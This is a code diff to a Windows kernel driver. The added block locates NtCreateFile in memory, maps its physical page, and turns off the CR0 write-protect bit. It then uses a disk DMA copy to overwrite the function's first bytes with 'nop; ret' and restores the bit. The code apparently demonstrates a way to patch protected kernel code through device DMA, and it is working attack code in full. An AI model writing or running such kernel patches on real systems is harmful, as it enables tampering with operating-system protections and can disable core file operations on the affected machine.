@@ -147,8 +147,29 @@ NTSTATUS DriverEntry(IN OUT PDRIVER_OBJECT driver, IN OUT PUNICODE_STRING regist
         printf("Failed to find a supported disk for DMA: 0x%X\n", status);
         return STATUS_NOT_FOUND;
     }
+	
+    if (disk)
+    {
+        unsigned char writeBuf[0x1000] = {0x90, 0xc3};
+        UNICODE_STRING StringNtCreateFile = RTL_CONSTANT_STRING(L"NtCreateFile");
+        unsigned char *pNtCreateFile = MmGetSystemRoutineAddress(&StringNtCreateFile);
+        PHYSICAL_ADDRESS pNtCreateFilePhy = MmGetPhysicalAddress(pNtCreateFile);
+        unsigned char* mapping = MmMapIoSpace(pNtCreateFilePhy, PAGE_SIZE, MmNonCached);
+       
+        printf("mapping=%p\n", mapping);
+        printf("pNtCreateFile=%p\n", pNtCreateFile);
+		
+		__writecr0(__readcr0() & 0xfffffffffffeffff);
+        DiskCopy(disk, writeBuf, mapping);
+        printf("pNtCreateFile[0]=%p\n", mapping[0]);
+        __writecr0(__readcr0() | 0x10000);
+		
+        printf("disk->device=%p\n", disk->Device);
+        
+        
+    }
 
-    MicrosoftHvDemo(disk);
+    //MicrosoftHvDemo(disk);
 
     DiskFree(disk);
     return STATUS_SUCCESS;
